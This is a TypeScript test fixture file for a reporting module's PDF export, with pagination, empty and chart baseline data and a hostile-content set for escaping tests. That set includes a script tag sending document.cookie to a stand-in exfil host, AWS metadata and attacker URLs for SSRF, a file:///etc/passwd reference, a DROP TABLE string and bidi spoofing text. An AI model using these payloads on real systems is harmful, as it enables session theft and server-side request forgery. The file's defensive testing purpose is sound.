/**
 * PDF export fixtures — WO-077 AC-3, AC-12.
 *
 * Provides:
 *   1. Multi-page report dataset (100 rows across multiple organisations)
 *   2. Hostile-content dataset — markup, external URLs, file:// refs, script tags
 *   3. Baseline chart configuration for snapshot comparison
 *
 * Hostile content is designed to exercise every escaping path in html-escape.ts:
 *   - script tag injection in a data cell
 *   - iframe with external src
 *   - external image pixel (classic tracking/SSRF probe)
 *   - file:// reference (filesystem read attempt)
 *   - javascript: pseudo-scheme in a URL field
 *   - data: URI (data exfiltration attempt)
 *   - bidi override characters (text spoofing)
 *   - zero-width joiners (layout breaking)
 *   - SQL injection characters (belt-and-suspenders, rendered as literal text)
 *   - extremely long unbroken string (layout overflow)
 *
 * IMPORTANT: these values must NEVER be rendered unescaped into any HTML context.
 * The integration tests assert that none of the raw hostile patterns appear in
 * the rendered HTML or the rendered PDF content.
 */

import type { ChartColumn, ChartDataRow } from '../../src/modules/reporting/domain/chart-option.builder';
import type { PdfTemplateData } from '../../src/modules/reporting/domain/report-pdf.template';

// ---------------------------------------------------------------------------
// Deterministic IDs
// ---------------------------------------------------------------------------

export const PDF_TENANT_A  = 'aa000000-0000-0000-0000-000000000001';
export const PDF_TENANT_B  = 'aa000000-0000-0000-0000-000000000002';
export const PDF_JOB_ID_1  = 'bb000000-0000-0000-0000-000000000001';
export const PDF_JOB_ID_2  = 'bb000000-0000-0000-0000-000000000002';

// ---------------------------------------------------------------------------
// Columns shared across fixtures
// ---------------------------------------------------------------------------

export const REPORT_COLUMNS: ChartColumn[] = [
  { key: 'd_organization', label: 'Organization' },
  { key: 'm_ticket_count', label: 'Ticket Count' },
  { key: 'm_avg_resolution_h', label: 'Avg Resolution (h)' },
];

// ---------------------------------------------------------------------------
// 1. Multi-page report dataset (100 rows — exercises pagination)
// ---------------------------------------------------------------------------

export const MULTI_PAGE_ROWS: ChartDataRow[] = Array.from({ length: 100 }, (_, i) => ({
  d_organization:     `Org ${String(i + 1).padStart(3, '0')}`,
  m_ticket_count:     Math.floor(10 + i * 3.7) % 300,
  m_avg_resolution_h: Math.round((2 + i * 0.3) * 10) / 10,
}));

export const MULTI_PAGE_TEMPLATE_DATA: PdfTemplateData = {
  tenantName:     'Acme Corp',
  reportTitle:    'Q3 2026 Support Summary',
  dataAsOf:       '2026-07-31T23:59:59.000Z',
  columns:        REPORT_COLUMNS,
  rows:           MULTI_PAGE_ROWS,
  chartType:      'bar',
  echartsPath:    '/usr/share/opsninja/echarts.min.js',
  classification: 'Confidential',
};

// ---------------------------------------------------------------------------
// 2. Hostile-content dataset (SSRF / XSS / injection probes)
// ---------------------------------------------------------------------------

/** External URLs that must never be fetched by the renderer. */
export const HOSTILE_EXTERNAL_URLS = [
  'https://ssrf-probe.evil.example.com/pixel.gif',
  'http://169.254.169.254/latest/meta-data/',         // AWS IMDS SSRF target
  'https://attacker.example.com/exfil?data=secret',
];

/** String constants for hostile values — referenced in assertion predicates. */
export const HOSTILE_SCRIPT_TAG     = '<script>fetch("https://exfil.evil.example.com/?c=" + document.cookie)</script>';
export const HOSTILE_IFRAME_SRC     = '<iframe src="https://evil.example.com" width="0" height="0"></iframe>';
export const HOSTILE_IMG_PIXEL      = '<img src="https://ssrf-probe.evil.example.com/pixel.gif" width="1" height="1">';
export const HOSTILE_FILE_REF       = '<img src="file:///etc/passwd">';
export const HOSTILE_JS_SCHEME      = 'javascript:alert(document.domain)';
export const HOSTILE_DATA_URI       = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==';
export const HOSTILE_BIDI_OVERRIDE  = 'Admin‮tca‪';   // RTL + LTR override
export const HOSTILE_ZERO_WIDTH     = 'Zero​width‌joiner‍';
export const HOSTILE_SQL_INJECTION  = "'; DROP TABLE report_schedules; --";
export const HOSTILE_LONG_STRING    = 'A'.repeat(5000);           // layout overflow

/** All hostile string values in one array — for parametrised "none appear raw" tests. */
export const ALL_HOSTILE_VALUES = [
  HOSTILE_SCRIPT_TAG,
  HOSTILE_IFRAME_SRC,
  HOSTILE_IMG_PIXEL,
  HOSTILE_FILE_REF,
  HOSTILE_JS_SCHEME,
  HOSTILE_DATA_URI,
  HOSTILE_BIDI_OVERRIDE,
  HOSTILE_ZERO_WIDTH,
  HOSTILE_SQL_INJECTION,
];

/** Patterns that must NEVER appear in any rendered output. */
export const FORBIDDEN_RENDERED_PATTERNS = [
  /<script\b/i,
  /<iframe\b/i,
  /<img\b/i,
  /ssrf-probe\.evil\.example\.com/i,
  /169\.254\.169\.254/,
  /attacker\.example\.com/,
  /javascript:/i,
  /data:text\/html/i,
  /file:\/\//i,
];

export const HOSTILE_ROWS: ChartDataRow[] = [
  {
    d_organization:     HOSTILE_SCRIPT_TAG,
    m_ticket_count:     1,
    m_avg_resolution_h: 0.5,
  },
  {
    d_organization:     HOSTILE_IFRAME_SRC,
    m_ticket_count:     2,
    m_avg_resolution_h: 1.0,
  },
  {
    d_organization:     HOSTILE_IMG_PIXEL,
    m_ticket_count:     3,
    m_avg_resolution_h: 1.5,
  },
  {
    d_organization:     HOSTILE_FILE_REF,
    m_ticket_count:     4,
    m_avg_resolution_h: 2.0,
  },
  {
    d_organization:     HOSTILE_BIDI_OVERRIDE,
    m_ticket_count:     5,
    m_avg_resolution_h: 2.5,
  },
  {
    d_organization:     HOSTILE_ZERO_WIDTH,
    m_ticket_count:     6,
    m_avg_resolution_h: 3.0,
  },
  {
    d_organization:     HOSTILE_SQL_INJECTION,
    m_ticket_count:     7,
    m_avg_resolution_h: 3.5,
  },
  {
    d_organization:     HOSTILE_LONG_STRING,
    m_ticket_count:     8,
    m_avg_resolution_h: 4.0,
  },
];

export const HOSTILE_TEMPLATE_DATA: PdfTemplateData = {
  tenantName:     'Test Tenant <evil>',
  reportTitle:    'Hostile Content Report "injection"',
  dataAsOf:       '2026-01-01T00:00:00.000Z',
  columns:        REPORT_COLUMNS,
  rows:           HOSTILE_ROWS,
  chartType:      'table',
  classification: 'Confidential',
};

// ---------------------------------------------------------------------------
// 3. Zero-row fixture (empty state edge case)
// ---------------------------------------------------------------------------

export const EMPTY_ROWS_TEMPLATE_DATA: PdfTemplateData = {
  tenantName:     'Empty Tenant',
  reportTitle:    'Zero Row Report',
  dataAsOf:       '2026-08-01T00:00:00.000Z',
  columns:        REPORT_COLUMNS,
  rows:           [],
  chartType:      'table',
  classification: 'Confidential',
};

// ---------------------------------------------------------------------------
// 4. Export job payload fixtures
// ---------------------------------------------------------------------------

export const MULTI_PAGE_EXPORT_PAYLOAD = {
  jobId:        PDF_JOB_ID_1,
  tenantId:     PDF_TENANT_A,
  format:       'pdf' as const,
  s3Key:        `exports/${PDF_TENANT_A}/${PDF_JOB_ID_1}.pdf`,
  sql:          'SELECT d_organization, m_ticket_count, m_avg_resolution_h FROM report_summary WHERE tenant_id = $1',
  params:       [PDF_TENANT_A],
  columns:      REPORT_COLUMNS,
  rowCap:       5000,
  requestedBy:  'user-lead-001',
  reportTitle:  'Q3 2026 Support Summary',
  chartType:    'bar' as const,
  tenantName:   'Acme Corp',
  dataAsOf:     '2026-07-31T23:59:59.000Z',
};

export const HOSTILE_EXPORT_PAYLOAD = {
  jobId:        PDF_JOB_ID_2,
  tenantId:     PDF_TENANT_A,
  format:       'pdf' as const,
  s3Key:        `exports/${PDF_TENANT_A}/${PDF_JOB_ID_2}.pdf`,
  sql:          'SELECT d_organization, m_ticket_count, m_avg_resolution_h FROM hostile_report WHERE tenant_id = $1',
  params:       [PDF_TENANT_A],
  columns:      REPORT_COLUMNS,
  rowCap:       5000,
  requestedBy:  'user-lead-002',
  reportTitle:  'Hostile Content Report',
  chartType:    'table' as const,
  tenantName:   'Test Tenant',
  dataAsOf:     '2026-01-01T00:00:00.000Z',
};

// ---------------------------------------------------------------------------
// 5. Baseline chart option (contract test reference)
// ---------------------------------------------------------------------------

/** Reference input for contract test comparing PDF builder vs browser builder. */
export const CHART_BASELINE_COLUMNS: ChartColumn[] = [
  { key: 'd_org',   label: 'Organization' },
  { key: 'm_count', label: 'Ticket Count' },
  { key: 'm_sla',   label: 'SLA %' },
];

export const CHART_BASELINE_ROWS: ChartDataRow[] = [
  { d_org: 'Acme',    m_count: 120, m_sla: 95.5 },
  { d_org: 'Globex',  m_count: 88,  m_sla: 87.2 },
  { d_org: 'Initech', m_count: 204, m_sla: 91.0 },
];

/**
 * Expected ECharts option shape produced by buildChartOption for the baseline.
 * The integration test asserts this equals the browser builder's output so
 * PDF and browser charts are configuration-equivalent.
 */
export const CHART_BASELINE_EXPECTED = {
  animation: false,
  dimensionKey: 'd_org',
  metricKeys: ['m_count', 'm_sla'],
  seriesCount: 2,
  categories: ['Acme', 'Globex', 'Initech'],
};
